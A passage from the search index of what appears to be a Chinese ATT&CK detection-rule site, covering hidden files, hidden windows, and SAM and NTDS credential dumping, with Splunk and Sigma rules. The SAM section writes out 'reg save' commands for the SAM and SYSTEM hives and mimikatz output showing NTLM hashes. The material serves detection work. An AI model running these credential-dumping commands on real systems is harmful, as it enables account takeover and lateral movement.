sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>Attrib\u547d\u4ee4\uff0c\u53ef\u4ee5\u8ba9\u6587\u4ef6\u5939\u5f7b\u5e95\u7684\u9690\u85cf\u8d77\u6765\uff0c\u5c31\u7b97\u662f\u5728\u6587\u4ef6\u5939\u9009\u9879\u4e2d\u8bbe\u7f6e\u4e86\u663e\u793a\u9690\u85cf\u6587\u4ef6\u5939\uff0c\u4e5f\u65e0\u6cd5\u663e\u793a\u51fa\u6765\u7684\u3002\u53ea\u80fd\u901a\u8fc7\u8def\u5f84\u8bbf\u95ee\u7684\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\u5939\u3002</p> <pre><code>C:\\Users\\splaybow&gt;help attrib\n\u663e\u793a\u6216\u66f4\u6539\u6587\u4ef6\u5c5e\u6027\u3002\nATTRIB [+R | -R] [+A | -A ] [+S | -S] [+H | -H] [+I | -I]\n       [drive:][path][filename] [/S [/D] [/L]]\n  + \u8bbe\u7f6e\u5c5e\u6027\u3002\n  - \u6e05\u9664\u5c5e\u6027\u3002\n  R \u53ea\u8bfb\u6587\u4ef6\u5c5e\u6027\u3002\n  A \u5b58\u6863\u6587\u4ef6\u5c5e\u6027\u3002\n  S \u7cfb\u7edf\u6587\u4ef6\u5c5e\u6027\u3002\n  H \u9690\u85cf\u6587\u4ef6\u5c5e\u6027\u3002\n  I \u65e0\u5185\u5bb9\u7d22\u5f15\u6587\u4ef6\u5c5e\u6027\u3002\n  [drive:][path][filename]\n      \u6307\u5b9a attrib \u8981\u5904\u7406\u7684\u6587\u4ef6\u3002\n  /S \u5904\u7406\u5f53\u524d\u6587\u4ef6\u5939\u53ca\u5176\u6240\u6709\u5b50\u6587\u4ef6\u5939\u4e2d\u7684\u5339\u914d\u6587\u4ef6\u3002\n  /D \u4e5f\u5904\u7406\u6587\u4ef6\u5939\u3002\n  /L \u5904\u7406\u7b26\u53f7\u94fe\u63a5\u548c\u7b26\u53f7\u94fe\u63a5\u76ee\u6807\u7684\u5c5e\u6027\u3002\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows sysmon/security</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u76d1\u89c6\u6587\u4ef6\u7cfb\u7edf\u548cShell\u547d\u4ee4\uff0c\u4ee5\u67e5\u627e\u4ee5\u201c.\u201d\u5f00\u5934\u7684\u6587\u4ef6\u3002\u548cWindows\u547d\u4ee4\u884c\u4f7f\u7528attrib.exe\u6dfb\u52a0\u9690\u85cf\u5c5e\u6027\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#splunk","title":"splunk\u89c4\u5219","text":"<pre><code>index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\attrib.exe\u201d CommandLine=\u201d*+s*\u201d)\nindex=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\attrib.exe\u201d CommandLine=\u201d*+h*\u201d)\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-win-%E9%9A%90%E8%97%8F%E7%9A%84%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1564-001</p> <p>https://attack.mitre.org/techniques/T1564/001/</p> <p>CMD\u4e2d\u4f7f\u7528attrib\u547d\u4ee4\u8bbe\u7f6e\u6587\u4ef6\u53ea\u8bfb\u3001\u9690\u85cf\u5c5e\u6027\u8be6\u89e3</p> <p>https://blog.csdn.net/whatday/article/details/52752555</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/","title":"T1564-003-windwos-\u9690\u85cf\u7a97\u53e3","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u9690\u85cf\u7684\u7a97\u53e3\u5c06\u6076\u610f\u6d3b\u52a8\u9690\u85cf\u5728\u7528\u6237\u7684\u89c6\u7ebf\u8303\u56f4\u4e4b\u5916\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u9690\u85cf\u901a\u5e38\u5728\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u64cd\u4f5c\u65f6\u663e\u793a\u7684\u7a97\u53e3\u3002\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u907f\u514d\u5728\u6267\u884c\u7ba1\u7406\u4efb\u52a1\u65f6\u7834\u574f\u5f53\u524d\u7528\u6237\u7684\u5de5\u4f5c\u73af\u5883\u3002</p> <p>\u5728Windows\u4e0a\uff0cWindows\u4e2d\u7684\u811a\u672c\u8bed\u8a00\u5177\u6709\u591a\u79cd\u529f\u80fd\uff0c\u4f8b\u5982PowerShell\uff0cJscript\u548cVisual Basic\uff0c\u53ef\u4ee5\u9690\u85cf\u7a97\u53e3\u3002\u4e00\u4e2a\u5178\u578b\u793a\u4f8b\u5c31\u662fpowershell.exe -WindowStyle Hidden\u3002</p> <p>\u540c\u6837\uff0c\u5728macOS\u4e0a\uff0c\u5c5e\u6027\u5217\u8868\uff08plist\uff09\u6587\u4ef6\u4e2d\u5217\u51fa\u4e86\u5e94\u7528\u7a0b\u5e8f\u8fd0\u884c\u65b9\u5f0f\u7684\u914d\u7f6e\u3002\u8fd9\u4e9b\u6587\u4ef6\u4e2d\u7684\u6807\u8bb0\u4e4b\u4e00\u53ef\u4ee5\u662fapple.awt.UIElement\uff0c\u5b83\u5141\u8bb8Java\u5e94\u7528\u7a0b\u5e8f\u963b\u6b62\u5e94\u7528\u7a0b\u5e8f\u7684\u56fe\u6807\u51fa\u73b0\u5728Dock\u4e2d\u3002\u5e38\u89c1\u7684\u7528\u6cd5\u662f\u5f53\u5e94\u7528\u7a0b\u5e8f\u5728\u7cfb\u7edf\u6258\u76d8\u4e2d\u8fd0\u884c\u4f46\u53c8\u4e0d\u60f3\u663e\u793a\u5728Dock\u4e2d\u65f6\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528\u8fd9\u4e9b\u529f\u80fd\uff0c\u4ee5\u5411\u7528\u6237\u9690\u85cf\u5176\u4ed6\u53ef\u89c1\u7684\u7a97\u53e3\uff0c\u4ece\u800c\u4e0d\u4f1a\u63d0\u9192\u7528\u6237\u7cfb\u7edf\u4e0a\u7684\u653b\u51fb\u8005\u6d3b\u52a8\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0\uff0c\u53ef\u53c2\u8003\u76f8\u5173\u6587\u7ae0\uff0c\u4f20\u9001\u95e8\uff1ahttps://zhuanlan.zhihu.com/p/25226349</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u53ef\u53c2\u8003\u6d4b\u8bd5\u6848\u4f8b\u4e2d\u76f8\u5173\u6587\u7ae0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u76d1\u89c6\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u662f\u5426\u6709\u6307\u793a\u9690\u85cf\u7a97\u53e3\u7684\u64cd\u4f5c\u3002\u5728Windows\u4e2d\uff0c\u542f\u7528\u5e76\u914d\u7f6e\u4e8b\u4ef6\u65e5\u5fd7\u8bb0\u5f55\u548cPowerShell\u65e5\u5fd7\u8bb0\u5f55\u4ee5\u68c0\u67e5\u9690\u85cf\u7684\u7a97\u53e3\u6837\u5f0f\u3002\u5728MacOS\u4e2d\uff0cplist\u6587\u4ef6\u662f\u5177\u6709\u7279\u5b9a\u683c\u5f0f\u7684ASCII\u6587\u672c\u6587\u4ef6\uff0c\u56e0\u6b64\u5b83\u4eec\u76f8\u5bf9\u5bb9\u6613\u89e3\u6790\u3002\u6587\u4ef6\u76d1\u89c6\u53ef\u4ee5\u68c0\u67e5plist\u6587\u4ef6\u4e2d\u7684apple.awt.UIElement\u6216\u4efb\u4f55\u5176\u4ed6\u53ef\u7591\u7684plist\u6807\u8bb0\u5e76\u5bf9\u5176\u8fdb\u884c\u6807\u8bb0\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#splunk","title":"splunk\u89c4\u5219","text":"<pre><code>index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1 Image=\u201d*\\\\powershell.exe\u201d CommandLine=\u201d*-WindowStyle Hidden*\u201d)\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_6","title":"\u5efa\u8bae","text":"<p>\u5982\u4e0a\u68c0\u6d4b\u89c4\u5219\uff0c\u5b58\u5728\u4e00\u5b9a\u7684\u5c40\u9650\u6027\uff0c\u53ef\u6839\u636e\u81ea\u5df1\u7684\u5b9e\u9645\u60c5\u51b5\uff0c\u4e0d\u65ad\u7684\u66f4\u65b0\u8981\u76d1\u89c6\u7684\u547d\u4ee4\u884c\u53c2\u6570\u3002\u5f53\u7136powershell\u65e5\u5fd7\u4e5f\u53ef\u4ee5\u505a\u5230\u5bf9\u547d\u4ee4\u884c\u53c2\u6570\u7684\u8bb0\u5f55\uff0c\u4e5f\u53ef\u901a\u8fc7powershell\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-003-win-%E9%9A%90%E8%97%8F%E7%AA%97%E5%8F%A3/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1564-003</p> <p>https://attack.mitre.org/techniques/T1564/003/</p> <p>PowerShell \u5b89\u5168\u4e13\u9898\u4e4b\u653b\u51fb\u68c0\u6d4b\u7bc7</p> <p>https://zhuanlan.zhihu.com/p/25226349</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","title":"T1003-002--windows-\u57fa\u4e8eSAM-reg\u51ed\u8bc1\u83b7\u53d6","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u51ed\u8bc1\u83b7\u53d6\u662f\u4ece\u64cd\u4f5c\u7cfb\u7edf\u548c\u8f6f\u4ef6\u4e2d\u83b7\u53d6\u767b\u5f55\u4fe1\u606f\u548c\u5bc6\u7801\u7684\u8fc7\u7a0b\uff0c\u901a\u5e38\u4e3aHASH\u6563\u5217\u6216\u660e\u6587\u5bc6\u7801\u3002\u7136\u540e\u4f7f\u7528\u51ed\u8bc1\u8fdb\u884c\u6a2a\u5411\u79fb\u52a8\u8bbf\u95ee\u5176\u4ed6\u7cfb\u7edf\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#samsecurity-accounts-manager","title":"SAM\uff08Security Accounts Manager\uff09","text":"<p>SAM\u6587\u4ef6\u662f\u4e00\u4e2a\u5b58\u50a8\u4e3b\u673a\u672c\u5730\u8d26\u6237\u4fe1\u606f\u7684\u6570\u636e\u5e93\u6587\u4ef6\uff0c\u901a\u5e38\u662f\"net user\"\u80fd\u770b\u5230\u7684\u7528\u6237\u3002\u60f3\u8981\u679a\u4e3eSAM\u6570\u636e\u5e93\uff0c\u4f60\u9700\u8981\u7cfb\u7edf\uff08system\uff09\u6743\u9650\u624d\u80fd\u591f\u8fdb\u884c\u64cd\u4f5c\u3002\u5b83\u53ef\u4ee5\u5728\u4e24\u79cd\u6a21\u5f0f\u4e0b\u5de5\u4f5c\uff1a\u5728\u7ebf\uff08\u4f7f\u7528SYSTEM\u7528\u6237\u6216\u4ee4\u724c\uff09\u6216\u79bb\u7ebf\uff08\u4f7f\u7528SYSTEM\uff06SAMhives\u6216backup\uff09\u3002</p> <p>\u5b89\u5168\u5e10\u6237\u7ba1\u7406\u5668\uff08SAM\uff09\uff0c\u5f80\u5f80\u662f\u4e00\u4e2a\u6570\u636e\u5e93\u6587\u4ef6\u5728Windows XP\u4e2d\uff0cWindows Vista\u4e2d\u3001Windows 7\u4e2d\u30018.1\u548c10\u5b58\u50a8\u7528\u6237\u7684\u5bc6\u7801\u3002\u5b83\u53ef\u7528\u4e8e\u9a8c\u8bc1\u672c\u5730\u548c\u8fdc\u7a0b\u7528\u6237\u3002\u4eceWindows 2000 SP4\u5f00\u59cb\uff0cActive Directory\u5bf9\u8fdc\u7a0b\u7528\u6237\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002SAM\u4f7f\u7528\u52a0\u5bc6\u63aa\u65bd\u6765\u9632\u6b62\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u8bbf\u95ee\u7cfb\u7edf\u3002</p> <p>\u7528\u6237\u5bc6\u7801\u4ee5\u6563\u5217\u683c\u5f0f\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u914d\u7f6e\u5355\u5143\u4e2d\uff0c\u53ef\u4ee5\u662fLM\u54c8\u5e0c\uff0c\u4e5f\u53ef\u4ee5\u662fNTLM\u54c8\u5e0c\u3002\u53ef\u4ee5\u5728\u6b64\u6587\u4ef6\u4e2d\u627e\u5230%SystemRoot%/system32/config/SAM\u5e76\u5b89\u88c5\u6b64\u6587\u4ef6HKLM/SAM\u3002LM\u54c8\u5e0c\u662f\u4e00\u79cd\u53d7\u635f\u7684\u534f\u8bae\uff0c\u5df2\u88abNTLM\u54c8\u5e0c\u53d6\u4ee3\u3002\u53ef\u4ee5\u5c06\u5927\u591a\u6570Windows\u7248\u672c\u914d\u7f6e\u4e3a\u5728\u7528\u6237\u66f4\u6539\u5bc6\u7801\u65f6\u7981\u7528\u6709\u6548LM\u54c8\u5e0c\u7684\u521b\u5efa\u548c\u5b58\u50a8\u3002Windows Vista\u548c\u66f4\u9ad8\u7248\u672c\u7684Windows\u9ed8\u8ba4\u7981\u7528LM\u54c8\u5e0c\u3002</p> <p>\u4e3a\u4e86\u63d0\u9ad8SAM\u6570\u636e\u5e93\u7684\u5b89\u5168\u6027\u4ee5\u9632\u6b62\u8131\u673a\u79bb\u7ebf\u7834\u89e3\uff0cMicrosoft\u5728Windows NT 4.0\u4e2d\u5f15\u5165\u4e86SYSKEY\u529f\u80fd\u3002\u542f\u7528SYSKEY\u540e\uff0cSAM\u6587\u4ef6\u7684\u78c1\u76d8\u526f\u672c\u5c06\u90e8\u5206\u52a0\u5bc6\uff0c\u4ee5\u4fbfSAM\u4e2d\u5b58\u50a8\u7684\u6240\u6709\u672c\u5730\u5e10\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u90fd\u4f7f\u7528\u5bc6\u94a5\u52a0\u5bc6\uff08\u901a\u5e38\u4e5f\u79f0\u4e3a\u201cSYSKEY\u201d\uff09\u3002\u53ef\u4ee5\u901a\u8fc7\u8fd0\u884c\u7a0b\u5e8f\u542f\u7528\u5b83\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4f60\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5de5\u5177\u8fdb\u884c\u68c0\u7d22\u8bfb\u53d6SAM\u6587\u4ef6\uff1a</p> <ul> <li>pwdump.exe</li> <li>Mimikatz</li> <li>gsecdump</li> <li>\u00b7\u00b7\u00b7\u00b7\u00b7\u00b7</li> </ul> <p>\u6216\u8005\uff0c\u53ef\u4ee5\u4f7f\u7528Reg\u4ece\u6ce8\u518c\u8868\u4e2d\u63d0\u53d6SAM\u6587\u4ef6\u4fe1\u606f\uff1a</p> <ul> <li>reg save HKLM\\SYSTEM SystemBkup.hiv</li> <li>reg save HKLM\\SAM SamBkup.hiv</li> </ul> <p>\u7136\u540e\u53ef\u4ee5\u4f7f\u7528Creddump7\u6216\u8005hashcat\u5728\u672c\u5730\u79bb\u7ebf\u63d0\u53d6\u54c8\u5e0c\u503c\u3002</p> <p>\u4f60\u4e5f\u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u5907\u4efd\u8fd9\u4e9b\u6587\u4ef6\uff1a</p> <ul> <li>C:\\Windows\\System32\\config\\SYSTEM</li> <li>C:\\Windows\\System32\\config\\SAM</li> </ul> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aRid 500\u8d26\u6237\u662f\u672c\u5730\u5185\u7f6e\u8d26\u6237\uff0cRid 501\u662f\u6765\u5bbe\u7528\u6237\uff0c\u7528\u6237\u8d26\u6237\u4ee5Rid 1000+\u5f00\u5934\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>sysmon\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#samsystemhashadministrator","title":"\u653b\u51fb\u65b9\u6cd5\uff1a\u672c\u5730\u5bfc\u51fasam\u3001system\u6587\u4ef6\uff0c\u79bb\u7ebf\u8fdb\u884chash\u63d0\u53d6(administrator)","text":"<pre><code>C:\\Users\\me\\Desktop&gt;reg save hklm\\sam sam.hiv\nThe operation completed successfully.\n\nC:\\Users\\me\\Desktop&gt;reg save hklm\\system system.hiv\nThe operation completed successfully.\n\nmimikatz # lsadump::sam /sam:sam.hiv /system:system.hiv\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000003eb (1003)\nUser : test\n  Hash NTLM: a2345375a47a92754e2505132aca194b\n\nRID  : 000003ec (1004)\nUser : test2\n  Hash NTLM: f0873f3268072c7b1150b15670291137\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","title":"sigma\u89c4\u5219","text":"<p>\u653b\u51fb\u65b9\u6cd5\uff1a\u672c\u5730\u5bfc\u51fasam\u3001system\u6587\u4ef6\uff0c\u79bb\u7ebf\u8fdb\u884chash\u63d0\u53d6(administrator)\u00b7</p> <pre><code>title: \u672c\u5730\u5bfc\u51fasam\u3001system\u6587\u4ef6\uff0c\u79bb\u7ebf\u8fdb\u884chash\u63d0\u53d6(administrator)\ndescription: windows 7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nreferences: https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump\ntags: ATT&amp;CK T1003-002\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u200b    product: windows\n\u200b    service: sysmon\ndetection:\n\u200b    selection1:\n\u200b        EventID: 1\n\u200b        Image: 'C:\\Windows\\System32\\reg.exe'\n\u200b        CommandLine: 'reg  save hklm\\sam *.hiv'\n\u200b    selection2:\n\u200b        EventID: 1\n\u200b        Image: 'Image: C:\\Windows\\System32\\reg.exe'\n\u200b        CommandLine: 'reg  save hklm\\system *.hiv'\n\u200b    timeframe: last 2m\n\u200b    condition: all of them\nlevel: high\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-002-win-SAM-reg%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1003-002</p> <p>https://attack.mitre.org/techniques/T1003/002</p> <p>pwdump7</p> <p>http://passwords.openwall.net/b/pwdump/pwdump7.zip</p> <p>powershell</p> <p>https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1</p> <p>mimikatz wiki</p> <p>https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</p> <p>\u5173\u4e8e\u66f4\u591a\u901a\u8fc7SAM\u6570\u636e\u5e93\u83b7\u53d6\u672c\u5730\u7528\u6237hash\u4f60\u4e5f\u53ef\u4ee5\u53c2\u8003</p> <p>https://www.4hou.com/technology/10878.html</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","title":"T1003-003-windows-\u57fa\u4e8eNTDS\u51ed\u8bc1\u83b7\u53d61","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u6216\u521b\u5efaActive Directory\u57df\u6570\u636e\u5e93\u7684\u526f\u672c\uff0c\u4ee5\u4fbf\u7a83\u53d6\u51ed\u636e\u4fe1\u606f\uff0c\u4ee5\u53ca\u83b7\u53d6\u6709\u5173\u57df\u6210\u5458\uff08\u4f8b\u5982\u8bbe\u5907\uff0c\u7528\u6237\u548c\u8bbf\u95ee\u6743\u9650\uff09\u7684\u5176\u4ed6\u4fe1\u606f\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\uff08NTDS.dit\uff09\u4f4d\u4e8e%SystemRoot%\\NTDS\\Ntds.dit\u57df\u63a7\u5236\u5668\u4e2d\u3002</p> <p>\u9664\u4e86\u5728\u6d3b\u52a8\u7684\u57df\u63a7\u5236\u5668\u4e0a\u67e5\u627eNTDS\u6587\u4ef6\u4e4b\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u641c\u7d22\u5305\u542b\u76f8\u540c\u6216\u76f8\u4f3c\u4fe1\u606f\u7684\u5907\u4efd\u3002</p> <p>\u4e0b\u5217\u5de5\u5177\u548c\u6280\u672f\u53ef\u7528\u4e8e\u679a\u4e3eNTDS\u6587\u4ef6\u548c\u6574\u4e2aActive Directory\u54c8\u5e0c\u7684\u5185\u5bb9\u3002</p> <p>\u5377\u5f71\u590d\u5236</p> <p>secretsdump.py</p> <p>\u4f7f\u7528\u5185\u7f6e\u7684Windows\u5de5\u5177ntdsutil.exe</p> <p>\u8c03\u7528\u5377\u5f71\u526f\u672c</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#ntdsdit","title":"NTDS.dit","text":"<p>Ntds.dit\u6587\u4ef6\u662f\u5b58\u50a8Active Directory\u6570\u636e\u7684\u6570\u636e\u5e93\uff0c\u5305\u62ec\u6709\u5173\u7528\u6237\u5bf9\u8c61\uff0c\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u7684\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\u3002\u57df\u63a7\u5236\u5668\uff08DC\uff09\u4e0a\u7684ntds.dit\u6587\u4ef6\u53ea\u80fd\u7531\u53ef\u4ee5\u767b\u5f55\u5230DC\u7684\u7528\u6237\u8bbf\u95ee\u3002\u5f88\u660e\u663e\uff0c\u4fdd\u62a4\u8fd9\u4e2a\u6587\u4ef6\u81f3\u5173\u91cd\u8981\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5bfc\u81f4\u6574\u4e2a\u57df\u6ca6\u9677\u3002</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cNTDS\u6587\u4ef6\u5c06\u4f4d\u4e8e\u57df\u63a7\u5236\u5668\u7684\uff05SystemRoot\uff05\\NTDS\\Ntds.dit\u4e2d\u3002 \u4f46\u901a\u5e38\u5b58\u50a8\u5728\u5176\u4ed6\u903b\u8f91\u9a71\u52a8\u5668\u4e0a\uff09\u3002AD\u6570\u636e\u5e93\u662f\u4e00\u4e2aJet\u6570\u636e\u5e93\u5f15\u64ce\uff0c\u5b83\u4f7f\u7528\u53ef\u6269\u5c55\u5b58\u50a8\u5f15\u64ce\uff08ESE\uff09\u63d0\u4f9b\u6570\u636e\u5b58\u50a8\u548c\u7d22\u5f15\u670d\u52a1\u3002\u901a\u8fc7ESE\u7ea7\u522b\u7d22\u5f15\uff0c\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5bf9\u8c61\u5c5e\u6027\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-NTDS.dit-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u901a\u8fc7\u63d0\u53d6\u8fd9\u4e9b\u54c8\u5e0c\u503c\uff0c\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982Mimikatz\u4e4b\u7c7b\u7684\u5de5\u5177\u6765\u6267\u884c\u4f20\u9012\u54c8\u5e0c\u653b\u51fb\uff0c\u621